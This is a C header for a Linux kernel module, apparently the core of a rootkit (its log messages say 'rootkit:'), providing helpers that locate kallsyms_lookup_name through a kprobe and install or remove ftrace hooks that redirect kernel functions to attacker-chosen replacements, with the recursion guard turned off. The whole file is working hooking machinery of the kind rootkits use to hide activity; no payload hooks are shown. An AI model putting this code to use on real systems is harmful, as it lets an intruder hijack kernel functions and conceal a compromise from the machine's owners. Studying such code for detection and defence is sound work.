#ifndef HELPERS_H
#define HELPERS_H
// TODO go over code, refine it, remove includes, etc...

#include <linux/linkage.h>
#include <linux/init.h>

#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <asm/unistd.h>


/* We need to prevent recursive loops when hooking, otherwise the kernel will
 * panic and hang.
 */
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif



 /////////////////////////////////////////// DEFINITIONS /////////////////////////////////////////// 

// Define the type for kallsyms ptr
typedef unsigned long (*kallsyms_lookup_name_t)(const char* name);


// A hook that represents the original function, the hooking function, and the name of the function
#define HOOK(_name, _hook, _orig) { \
    .name = (_name),                \
    .function = (_hook),            \
    .original = (_orig),            \
}



 /* We pack all the information we need (name, hooking function, original function)
  * into this struct. This makes is easier for setting up the hook and just passing
  * the entire struct off to fh_install_hook() later on.
  * */
struct ftrace_hook {
    const char* name;
    void* function;
    void* original;

    unsigned long address;
    struct ftrace_ops ops;
};

/////////////////////////////////////////// kallsyms helpers /////////////////////////////////////////// 


static kallsyms_lookup_name_t _kallsyms_lookup(void) {
    //printk("in init.\n");

    static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };

    kallsyms_lookup_name_t kallsyms_lookup_name;
    pr_info("pre register.\n");

    register_kprobe(&kp);
    pr_info("post register.\n");

    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;

    unregister_kprobe(&kp);
    pr_info("unregistered.\n");


    return kallsyms_lookup_name;
}


/////////////////////////////////////////// ftrace helpers /////////////////////////////////////////// 


/* Ftrace needs to know the address of the original function that we
 * are going to hook. As before, we just use kallsyms_lookup_name()
 * to find the address in kernel memory.
 * */
static int fh_resolve_hook_address(struct ftrace_hook* hook) {
    kallsyms_lookup_name_t kallsyms_lookup_name = _kallsyms_lookup();
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        pr_info("rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

    // for the recursion? add note
#if USE_FENTRY_OFFSET
    * ((unsigned long*)hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    * ((unsigned long*)hook->original) = hook->address;
#endif

    return 0;
}

/* See comment below within fh_install_hook() */
static void notrace fh_ftrace_thunk(unsigned long ip,
                                    unsigned long parent_ip,
                                    struct ftrace_ops* ops,
                                    struct ftrace_regs* regs)
{
    struct ftrace_hook* hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long)hook->function;
#else
    if (!within_module(parent_ip, THIS_MODULE))
    ((struct pt_regs*)regs)->ip = (unsigned long)hook->function;
#endif
}


/* Assuming we've already set hook->name, hook->function and hook->original, we
 * can go ahead and install the hook with ftrace. This is done by setting the
 * ops field of hook (see the comment below for more details), and then using
 * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
 * provided by ftrace.h
 * */
int fh_install_hook(struct ftrace_hook* hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if (err)
        return err;

    /* For many of function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
        | FTRACE_OPS_FL_RECURSION
        | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err)
    {
        pr_info("rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err)
    {
        pr_info("rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

/* Disabling our function hook is just a simple matter of calling the built-in
 * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
 * opposite order to that in fh_install_hook()).
 * */
void fh_remove_hook(struct ftrace_hook* hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if (err)
    {
        pr_info("rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
    {
        pr_info("rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

/* To make it easier to hook multiple functions in one module, this provides
 * a simple loop over an array of ftrace_hook struct
 * */
int fh_install_hooks(struct ftrace_hook* hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0; i < count; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if (err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook* hooks, size_t count)
{
    size_t i;

    for (i = 0; i < count; i++)
        fh_remove_hook(&hooks[i]);
}

#endif // MY_HEADER_H
